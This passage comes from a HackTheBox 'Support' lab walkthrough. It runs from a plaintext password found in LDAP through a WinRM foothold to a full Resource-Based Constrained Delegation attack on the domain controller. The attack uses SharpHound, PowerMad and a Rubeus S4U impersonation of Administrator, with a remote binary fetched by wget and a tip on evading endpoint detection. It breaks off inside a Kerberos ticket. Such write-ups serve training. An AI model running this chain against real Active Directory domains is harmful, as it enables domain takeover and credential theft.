sAMAccountName: stoll.rachelle
sAMAccountName: ford.victoria
```

**Key finding:** the `support` user object carries a non-default `info` attribute containing `Ironside47pleasure40Watchful` — a plaintext password stored in a notes field — providing candidate credentials for the `support` account.

**Next:** The `support` account is a member of Remote Management Users, so authenticate over WinRM with these credentials to obtain an interactive foothold.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation — Initial Access

### 3.1 Establish a WinRM Foothold

The `support` user's password was recovered from its LDAP `info` field, and the account belongs to Remote Management Users; authenticating over WinRM converts those credentials into an interactive shell.

**Command:** `evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'`

**Breakdown:**

- `evil-winrm`
    - **Description:** Ruby WinRM client that provides an interactive PowerShell session against a Windows target.
    - **Purpose:** Speaks WinRM from Linux, which has no native client, to obtain a remote shell.
- `-i support.htb`
    - **Description:** Target host (IP or hostname).
    - **Purpose:** Directs the connection at the domain controller over WinRM (port 5985).
- `-u support`
    - **Description:** Username to authenticate as.
    - **Purpose:** Logs in as the compromised `support` account.
- `-p 'Ironside47pleasure40Watchful'`
    - **Description:** Password for the account.
    - **Purpose:** Supplies the plaintext recovered from the LDAP `info` field.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> 
```

**Key finding:** an interactive PowerShell shell on `dc.support.htb` as the `support` domain user — foothold established.

**Next:** Capture the user flag to confirm access, then enumerate the account's group memberships to find a privilege-escalation path.

> **WinRM** = **Windows Remote Management**. It's Microsoft's built-in protocol for administering a Windows machine over the network — running commands, scripts, and management tasks remotely. Think of it as **Windows' equivalent of SSH**: on Linux you SSH into a box to get a shell; on Windows, WinRM is one of the standard ways to get a remote command-line session. It's what PowerShell uses.
> 
> **That's why port 5985 mattered.** Back in the Nmap scan, `5985/tcp open wsman` was WinRM listening (5985 is plain HTTP; 5986 would be the HTTPS version). A service being open is only useful if you can authenticate to it — and now we can.
> 
> **Not every account can use it.** WinRM access is gated by membership in the **Remote Management Users** group (or being an admin).
> 
> **`evil-winrm` is the tool.** It's a popular Ruby client that speaks WinRM from Linux and hands you an interactive PowerShell prompt on the target, plus conveniences like `upload` and `download` for moving files — which we'll lean on heavily during privilege escalation (uploading SharpHound, Rubeus, PowerView, etc.). Standard-issue on Kali for exactly this kind of engagement.
> 
> WinRM is the _protocol_ (the service on the target, port 5985). `evil-winrm` is just one _client_ that speaks it. The protocol is fixed — the target only accepts WinRM — but you have a choice of what client you point at it. So it's not that WinRM is a "Kali thing" and something else is a "Windows thing"; everyone talks to the same WinRM service. The question is only which tool you drive it with.
> If your attack box were Windows, you almost certainly _wouldn't_ reach for `evil-winrm` — you'd use the remoting that's already built into PowerShell
> 
> So the command:

```
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

> reads: _"Connect over WinRM to the host `support.htb`, log in as user `support` with this password, and give me a shell."_ `-i` is the target (IP or hostname), `-u` the username, `-p` the password. Success looks like an `*Evil-WinRM* PS C:\Users\support\Documents>` prompt. Run it and paste what you get.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Capture the User Flag

With an interactive shell as `support`, retrieving `user.txt` confirms and records the foothold before pivoting to privilege escalation.

**Command:** `type C:\Users\support\Desktop\user.txt`

**Result:**

```
3734ae4991aa885619247063e474ddf9
```

==USER FLAG==: `3734ae4991aa885619247063e474ddf9`

**Next:** Enumerate the account's domain context and group memberships to identify a path from `support` to the Domain Controller.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Privilege Escalation

### 4.1 Enumerate Domain Context and Group Memberships

With a foothold as `support`, mapping the account's domain role and group memberships identifies which privileges could be abused to escalate against the Domain Controller.

**Command:**

```
Get-ADDomain
whoami /groups
```

**Breakdown:**

- `Get-ADDomain`
    - **Description:** Active Directory PowerShell cmdlet that returns domain-wide properties.
    - **Purpose:** Confirms the host is the DC for `support.htb` and reveals domain SID and naming context.
- `whoami /groups`
    - **Description:** Lists the security groups the current token belongs to, with SIDs and attributes.
    - **Purpose:** Exposes non-default group memberships that may carry escalation-relevant privileges.

**Result:**

```shell
*Evil-WinRM* PS C:\Users\support> Get-ADDomain


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=support,DC=htb
DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb
DistinguishedName                  : DC=support,DC=htb
DNSRoot                            : support.htb
DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-1677581083-3380853377-188903654
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb
Forest                             : support.htb
InfrastructureMaster               : dc.support.htb
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb}
LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb
ManagedBy                          :
Name                               : support
NetBIOSName                        : SUPPORT
ObjectClass                        : domainDNS
ObjectGUID                         : 553cd9a3-86c4-4d64-9e85-5146a98c868e
ParentDomain                       :
PDCEmulator                        : dc.support.htb
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {dc.support.htb}
RIDMaster                          : dc.support.htb
SubordinateReferences              : {DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb}
SystemsContainer                   : CN=System,DC=support,DC=htb
UsersContainer                     : CN=Users,DC=support,DC=htb



*Evil-WinRM* PS C:\Users\support> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
*Evil-WinRM* PS C:\Users\support> 
```

**`Get-ADDomain` — "what network am I on, and what is this machine?"**

This command just asks Active Directory to describe the domain. Most of the output is reference detail you can ignore. Three lines actually matter:

- `DNSRoot : support.htb` → the name of the domain (the "company network") you're inside.
- `DomainSID : S-1-5-21-1677581083-3380853377-188903654` → the domain's unique ID number. Every user and group in this domain has a SID that _starts_ with this same number, then adds a suffix. Hold that thought — it's how we spotted the custom group below.
- `PDCEmulator : dc.support.htb` and `ReplicaDirectoryServers : {dc.support.htb}` → these name the domain controller. Both point to `dc.support.htb`, and that's the machine you're already logged into. **Translation: the box you have a shell on isn't just any server — it's the brain of the whole domain.** That's why escalating here means owning everything.

So `Get-ADDomain` told us one important thing: _we're standing on the domain controller itself._
<div align="center">
<br>
<br>
</div>


**`whoami /groups` — "what am I a member of, and what does that let me do?"**

In Windows, your permissions don't come from _you_ directly — they come from the **groups you belong to**. It's like building access at an office: your keycard opens the doors your department is allowed into. So to know what `support` can do, we look at its group list. Most entries are default groups every user has (`Everyone`, `BUILTIN\Users`, etc.) — boring, ignore them. Two are not:

**`NT AUTHORITY\Authenticated Users`** — every logged-in domain user is in this. Sounds boring, but it carries a hidden default power: a member can **create up to 10 new computer accounts in the domain**. That sounds harmless ("why would I want to add a computer?"), but that exact ability is step one of the attack we're building toward. File it away.

**`SUPPORT\Shared Support Accounts`** — _this_ is the interesting one, and here's how we know it's special. Look at its SID:

```
S-1-5-21-1677581083-3380853377-188903654 -1103└──────────── the domain SID ────────────┘ └┬─┘                                          the suffix
```

The first part is the exact domain SID from `Get-ADDomain`, so this group is **local to this domain** (not a built-in Windows group). And the suffix `-1103` is a _low_ number. Windows hands out these suffixes in order starting around 1000, so a low number like 1103 means this group was **created early, by a human administrator** — it's not something Windows ships with. A custom group made by an admin is exactly where misconfigured, over-generous permissions tend to hide.
<div align="center">
<br>
<br>
</div>

**The simple version of the finding**

> **You're logged into the domain controller as `support`. That account is in a special, admin-made group called "Shared Support Accounts." We don't yet know what powers that group was given — but custom groups often get handed too much, so that's what we investigate next.**
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.2 Collect Active Directory Data with SharpHound

Group membership showed `support` sits in the custom `Shared Support Accounts` group, but not what that group can do; SharpHound harvests the domain's ACLs so BloodHound can reveal the group's exact control over the DC.

**Commands:**

```
cd C:\Windows\Temp
upload SharpHound.exe
C:\Windows\Temp\SharpHound.exe -c All --outputdirectory C:\Users\support\Documents
cd C:\Users\support\Documents

```

**Breakdown:**

- `upload SharpHound.exe`
    - **Description:** `evil-winrm` built-in that pushes a local file to the target.
    - **Purpose:** Places the BloodHound collector on the DC for execution.
- `SharpHound.exe -c All`
    - **Description:** Runs SharpHound with the `All` collection method set.
    - **Purpose:** Gathers group memberships, sessions, trusts, and — critically — ACLs, which hold the `GenericAll` right being hunted.
- `--outputdirectory C:\Users\support\Documents`
    - **Description:** Forces the results zip to a specific folder.
    - **Purpose:** Avoids the `evil-winrm` working-directory mismatch, where `cd` changes PowerShell's location but not the process cwd, causing the default output to land in an unreadable path.

**Result:**

```shell
*Evil-WinRM* PS C:\Users\support\Documents> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> upload SharpHound.exe

Info: Uploading /home/kali/nedmoeca/HTB/Machines/Retired/Support/SharpHound.exe to C:\Windows\Temp\SharpHound.exe

Info: Upload successful!
*Evil-WinRM* PS C:\Windows\Temp> C:\Windows\Temp\SharpHound.exe -c All --outputdirectory C:\Users\support\Documents
2026-07-22T04:45:47.7301735-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2026-07-22T04:45:47.9176907-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2026-07-22T04:45:47.9332973-07:00|INFORMATION|Initializing SharpHound at 4:45 AM on 7/22/2026
2026-07-22T04:45:48.4020744-07:00|INFORMATION|Loaded cache with stats: 67 ID to type mappings.
 67 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2026-07-22T04:45:48.4176746-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2026-07-22T04:45:48.5895594-07:00|INFORMATION|Beginning LDAP search for support.htb
2026-07-22T04:45:48.6364249-07:00|INFORMATION|Producer has finished, closing LDAP channel
2026-07-22T04:45:48.6364249-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2026-07-22T04:46:19.4802056-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 39 MB RAM
2026-07-22T04:46:37.8083336-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2026-07-22T04:46:37.8551726-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2026-07-22T04:46:37.9489208-07:00|INFORMATION|Status: 108 objects finished (+108 2.204082)/s -- Using 44 MB RAM
2026-07-22T04:46:37.9489208-07:00|INFORMATION|Enumeration finished in 00:00:49.3640602
2026-07-22T04:46:38.0270481-07:00|INFORMATION|Saving cache with stats: 67 ID to type mappings.
 67 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2026-07-22T04:46:38.0426726-07:00|INFORMATION|SharpHound Enumeration Completed at 4:46 AM on 7/22/2026! Happy Graphing!
*Evil-WinRM* PS C:\Windows\Temp> cd C:\Users\support\Documents
*Evil-WinRM* PS C:\Users\support\Documents> dir


    Directory: C:\Users\support\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/22/2026   4:46 AM          12378 20260722044637_BloodHound.zip
-a----         7/22/2026   4:43 AM        1051648 SharpHound.exe
-a----         7/22/2026   4:46 AM          10022 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin


*Evil-WinRM* PS C:\Users\support\Documents> download 20260722044637_BloodHound.zip

Info: Downloading C:\Users\support\Documents\20260722044637_BloodHound.zip to 20260722044637_BloodHound.zip

Info: Download successful!
*Evil-WinRM* PS C:\Users\support\Documents> 
```

**Key finding:** SharpHound enumerated all 108 domain objects and produced `20260722040820_BloodHound.zip` containing the domain's ACL data, ready for analysis.

**Next:** Download the zip to the attack host and load it into BloodHound to map `Shared Support Accounts`' privileges over the Domain Controller.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.3 Analyze the Attack Path in BloodHound

Group enumeration showed `support` belongs to the custom `Shared Support Accounts` group; loading the SharpHound data into BloodHound reveals what that group can actually do to the Domain Controller.

**Command (BloodHound CE workflow):**

```
# 1. Start the stack and open the web UI
sudo bloodhound-start        # http://localhost:8080  (login admin/admin)
# 2. Quick Upload → drop the SharpHound zip → wait for ingest
# 3. Search node: "Shared Support Accounts"
# 4. Entity panel → Outbound Object Control
```

**Breakdown:**

- `Quick Upload`
    - **Description:** BloodHound CE ingestion of the SharpHound zip.
    - **Purpose:** Builds the graph of domain objects and their relationships from collected data.
- `Search node → Shared Support Accounts`
    - **Description:** Locates the group object in the graph.
    - **Purpose:** Focuses analysis on the custom group `support` belongs to.
- `Outbound Object Control`
    - **Description:** Entity-panel section listing objects the selected node controls.
    - **Purpose:** Reveals the group's ACL-based control over other objects — here, the DC.

**Reading a BloodHound edge:** Nodes are AD objects (groups, users, computers); labeled arrows are permissions or relationships. An arrow reading `GenericAll` from a group to a computer means every member of that group holds full-control rights over that computer object in AD — able to reset attributes, passwords, and delegation settings.

**Result:**

![[bloodhound_genericall.png.png]]

**Key finding:** the `Shared Support Accounts` group holds `GenericAll` over the Domain Controller `DC.SUPPORT.HTB`, and `support` is a member — granting full control of the DC object and satisfying the write-privilege precondition for a Resource-Based Constrained Delegation attack.

**Next:** Confirm the two remaining RBCD prerequisites (machine account quota, empty delegation attribute), then execute the attack to impersonate a Domain Admin.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.4 Verify the Machine Account Quota

RBCD requires adding a computer account to the domain; the `ms-DS-MachineAccountQuota` attribute controls whether an authenticated user is permitted to do so, so its value must be confirmed greater than zero before proceeding.

**Command:** `Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota`

**Breakdown:**

- `Get-ADObject`
    - **Description:** Retrieves an arbitrary Active Directory object and selected attributes.
    - **Purpose:** Reads the domain object to inspect the machine-account quota.
- `-Identity ((Get-ADDomain).distinguishedname)`
    - **Description:** Targets the domain root object (`DC=support,DC=htb`).
    - **Purpose:** The quota attribute lives on the domain object itself.
- `-Properties ms-DS-MachineAccountQuota`
    - **Description:** Requests a non-default attribute that isn't returned by default.
    - **Purpose:** Surfaces the exact number of computers an authenticated user may add.

**Result:**

```shell
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota


DistinguishedName         : DC=support,DC=htb
ms-DS-MachineAccountQuota : 10
Name                      : support
ObjectClass               : domainDNS
ObjectGUID                : 553cd9a3-86c4-4d64-9e85-5146a98c868e
```

**Key finding:** the quota is `10`, so `support` may add computer accounts to the domain — the final precondition for RBCD is met.

**Next:** Upload the attack tooling (PowerMad, Rubeus), create an attacker-controlled computer account, and configure the DC to allow it to act on the DC's behalf.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.5 Acquire and Upload the RBCD Tooling

The RBCD attack needs a tool to create a computer account and a tool to request Kerberos tickets; PowerMad and Rubeus provide these and must be transferred to the target before the attack can run.

**Command (on the attack host — obtain the tools):**

```
# PowerMad ships with PowerShell Empire on Kali
cp /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powermad.ps1 ./Powermad.ps1

# Rubeus — download a precompiled GhostPack binary
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
```

**Command (in the Evil-WinRM session — upload to the target):**

```
cd C:\Users\support\Documents
upload Powermad.ps1
upload Rubeus.exe
```

**Breakdown:**

- `cp .../powermad.ps1 ./Powermad.ps1`
    - **Description:** Copies the bundled PowerMad script into the working directory.
    - **Purpose:** Stages the module locally so Evil-WinRM can upload it.
- `wget .../Rubeus.exe`
    - **Description:** Downloads a precompiled Rubeus binary.
    - **Purpose:** Provides the Kerberos-abuse tool used for the later S4U request.
- `upload <file>`
    - **Description:** Evil-WinRM built-in that pushes a local file to the current remote directory.
    - **Purpose:** Places both tools on the DC where they will be executed. Bare filenames resolve against the directory Evil-WinRM was launched from; use an absolute local path if launched elsewhere.

**Theory — tool provenance:** GhostPack (Rubeus) does not distribute official compiled binaries; precompiled mirrors are convenient for lab use, but in a real engagement the binary should be compiled from source and, where possible, obfuscated to avoid trusting a third-party build and to evade endpoint detection.

**Result:**

```shell
*Evil-WinRM* PS C:\Users\support\Documents> upload Powermad.ps1

Info: Uploading /home/kali/nedmoeca/HTB/Machines/Retired/Support/Powermad.ps1 to C:\Users\support\Documents\Powermad.ps1

Data: 179940 bytes of 179940 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\support\Documents> upload Rubeus.exe

Info: Uploading /home/kali/nedmoeca/HTB/Machines/Retired/Support/Rubeus.exe to C:\Users\support\Documents\Rubeus.exe

Data: 595968 bytes of 595968 bytes copied

Info: Upload successful!
```

**What this gives you:** PowerMad and Rubeus are staged in `C:\Users\support\Documents` on the DC, ready to create the computer account and perform the S4U ticket request.

**Next:** Import PowerMad and create the attacker-controlled computer account `FAKE-COMP01$`.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.6 Create an Attacker-Controlled Computer Account

RBCD requires a computer principal the attacker controls to act as the delegation target; with the machine-account quota confirmed, PowerMad creates that account inside the domain.

**Command:**

```
. .\Powermad.ps1
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
Get-ADComputer -Identity FAKE-COMP01
```

**Breakdown:**

- `. .\Powermad.ps1`
    - **Description:** Dot-sources the PowerMad script, loading its functions into the session.
    - **Purpose:** Makes `New-MachineAccount` available in the current shell.
- `New-MachineAccount -MachineAccount FAKE-COMP01 -Password ...`
    - **Description:** Creates a new computer account with the supplied name and password.
    - **Purpose:** Adds an attacker-controlled machine (`FAKE-COMP01$`) whose credentials are known.
- `ConvertTo-SecureString 'Password123' -AsPlainText -Force`
    - **Description:** Wraps a plaintext password into the SecureString type the cmdlet expects.
    - **Purpose:** Sets a known password so the account's Kerberos hash can be derived later.
- `Get-ADComputer -Identity FAKE-COMP01`
    - **Description:** Reads back the new computer object.
    - **Purpose:** Confirms creation and reveals the account's SID.

**Result:**

```
[+] Machine account FAKE-COMP01 added
DistinguishedName : CN=FAKE-COMP01,CN=Computers,DC=support,DC=htbName              : FAKE-COMP01SamAccountName    : FAKE-COMP01$SID               : S-1-5-21-1677581083-3380853377-188903654-6101Enabled           : True
```

**Key finding:** an attacker-controlled computer account `FAKE-COMP01$` now exists in the domain with a known password — the principal that the DC will be configured to trust for delegation.

**Next:** Using the `GenericAll` right over the DC, set its `PrincipalsAllowedToDelegateToAccount` to `FAKE-COMP01$`, authorizing that account to act on the DC's behalf.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.7 Configure Resource-Based Constrained Delegation

With `GenericAll` over the DC and an attacker-controlled computer account in place, writing the DC's delegation attribute authorizes `FAKE-COMP01$` to impersonate any user when authenticating to the DC — the core of the RBCD attack.

**Command:**

```
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```

**Breakdown:**

- `Set-ADComputer -Identity DC`
    - **Description:** Modifies attributes of the DC computer object.
    - **Purpose:** Writes to the DC — permitted only because `support` holds `GenericAll` over it.
- `-PrincipalsAllowedToDelegateToAccount FAKE-COMP01$`
    - **Description:** Friendly PowerShell wrapper for the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
    - **Purpose:** Declares `FAKE-COMP01$` as a principal allowed to act on the DC's behalf, enabling S4U impersonation.

**How RBCD leads to impersonation:** Resource-Based Constrained Delegation lets a resource (here, the DC) specify which accounts may request tickets _on behalf of other users_ to it. Once `FAKE-COMP01$` is listed, Kerberos S4U (Service-for-User) extensions allow the holder of `FAKE-COMP01$`'s credentials to obtain a service ticket to the DC that impersonates an arbitrary user — including a Domain Admin such as `Administrator`. Presenting that ticket yields access to the DC as that impersonated identity.

**Result:**

```shell
*Evil-WinRM* PS C:\Users\support\Documents> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount


DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb
DNSHostName                          : dc.support.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127
PrincipalsAllowedToDelegateToAccount : {CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb}
SamAccountName                       : DC$
SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000
UserPrincipalName                    :



*Evil-WinRM* PS C:\Users\support\Documents> 
```

**Key finding:** the DC's `PrincipalsAllowedToDelegateToAccount` now contains `FAKE-COMP01`, so the attacker-controlled account can perform S4U impersonation against the Domain Controller.

**Next:** Derive `FAKE-COMP01$`'s Kerberos hash, then run a Rubeus S4U request to obtain a ticket impersonating `Administrator`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.8 Perform the S4U Attack with Rubeus

With the DC configured to trust `FAKE-COMP01$`, Rubeus uses that account's Kerberos hash to request, via S4U, a service ticket impersonating `Administrator` to the DC's CIFS service.

**Command:**

```
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

**Breakdown:**

- `Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$`
    - **Description:** Derives Kerberos key material from a plaintext password and account salt.
    - **Purpose:** Produces the `rc4_hmac` key S4U needs to authenticate as `FAKE-COMP01$`.
- `s4u /user:FAKE-COMP01$ /rc4:...`
    - **Description:** Runs the S4U2self + S4U2proxy exchange as the fake computer.
    - **Purpose:** Obtains a ticket on behalf of another user through the delegation just configured.
- `/impersonateuser:Administrator`
    - **Description:** The identity to impersonate.
    - **Purpose:** Targets the Domain Admin account for full DC compromise.
- `/msdsspn:cifs/dc.support.htb`
    - **Description:** The service principal name to request the ticket for.
    - **Purpose:** CIFS access to the DC is sufficient for a remote SYSTEM shell via PsExec.
- `/ptt`
    - **Description:** Pass-the-ticket — injects the ticket into the session.
    - **Purpose:** Also prints the base64 ticket, which is exported to the attack host for use with Impacket.

**Result:**

```shell

*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : Password123
[*] Input username             : FAKE-COMP01$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostfake-comp01.support.htb
[*]       rc4_hmac             : 58A478135A93AC3BF058A5EA0E8FDB71
[*]       aes128_cts_hmac_sha1 : 06C1EABAD3A21C24DF384247BC85C540
[*]       aes256_cts_hmac_sha1 : FF7BA224B544AA97002B2BEE94EADBA7855EF81A1E05B7EB33D4BCD55807FF53
[*]       des_cbc_md5          : 5B045E854358687C

*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: 58A478135A93AC3BF058A5EA0E8FDB71
[*] Building AS-REQ (w/ preauth) for: 'support.htb\FAKE-COMP01$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFhDCCBYCgAwIBBaEDAgEWooIEmDCCBJRhggSQMIIEjKADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBFIwggROoAMCARKhAwIBAqKCBEAEggQ8f2FEWu85
      OfuUXcY6DCEVOvMK6xjf6/25esPcLfxTO1XqW7KRwyq8zxN7EfUd46IbhSOz0YwMzKNEKWp/8GK49u+T
      SqLZ8t3hrR7WeCE02L15iJO2HSjOPHdGCJg4c8QNuqkWKtNi9biTiFpO6KFaJ7yX1AWOZ2dgcLSGmJUE
      oAwAp1FiZ2D3cq5GD8WOVs8iG66UGjxqlu4HrtQkkQXBQkkPKvxTbDBdnbbydSoaRuqm1CIjg+lWgYxn
      ncRPULDTFoUIadbMOwTVBp8ETq2o+Jv6fzBbVM9if2//vuVpdnn2u0qrytw9nYGLDRJnLp50hWVJLhVh
      YcOvkRqXxP/Tg09whx7k3eHzA81tGdGh+S5LAQBH0SKnLQ5vib8cB4T9/qc8aDTwAg4iXQT6sAgnssZt
      7uwokeU518EGLJyEGtew2wVwHJaqDqCa2rVpIZVVKxJ0en/83z/S5AyCrcRfOBszAijBa/PSLNsxtoFu
      zQOxIBiBeA510tK+nHr1CKP2eo8c+A3vFqRe5nt5MupaFC5v4PBYj0m2ZfRyH3mmbq3J/tRC7THrqYKa
      RnRQP/l7csY9BlUyTEwDSUUyV6NKq2Ydez9uodAIcUbeZes3mPNC28YTMy94lFAOpjZef6/Rs2Xo1m/Z
      TndtvjThGJ4sMUyV7LVIKo4m0pY12gXudmzFCVrb4SMh0mUprFxROEmJpCLo2Qyj6fOKQxi46TK31ozr
      iBKaQWejYnCaNITwJ8ckSWvFU61njp36ckZBbf1sk9QAPWQFzw99/9BwMUK+gOGrGWoD0/qNx8RcxXhT
      e32QKrJ2lEc/onBu3nIXNT+aMSOLjiBHqIjKleLlKvooOxRUc674Vsr//jeWYkkzBLPWTgzZTdLKCO+P
      4GNBEMz5N+zn+WO2DYtyA1Xxm4JmEcDUrf+TYq1vW8b01qBvbREkWCJsxax4c9ncnNREYDGh+3HxAQ6N
      K9Ldyp8aHDjdCSCArHM7v5b0bwBOpyQzrU4ozVPxOT3gegYA6lYmRrcuZ9yMmNcTNQ57SwtDlEMlVpYz
      Z6E1LvGezYwWcRSLIQNXr+yUe331wCiQTejYcvPHBxQ+7fAPKtnBrWrgsp/ZgpXUpURHyiwD+ggvnWf8
      sJonYYxgYl1j6M0eL5R68B0cLogx/gma6/OjN5OZGscHCEheoyFQrV5ZyyXHrf1y6vaay41hBY7bHA65
      9rRO++/6aUOT8+WIW/fw5Mtnuh1PfeOKdUak9K6GYi0EpZ5zVvUQQItguSqFUzuoiJhIVOMAU2zqtqo4
      SitO9puNSWocUL6+rXqiGuHLJHzLtymm7L6Ad3sfT+Lv6wqppk6+CCe9UqR9zUq6qYtyT+U7mDMHuwNl
      mlhEIbMyx3/qVk2v7FJxqgY8TiV80OXeHv1YEgKRuQEaE5yjPJeIIV+/42HueICSH+i/wWzOm/YE+KOB
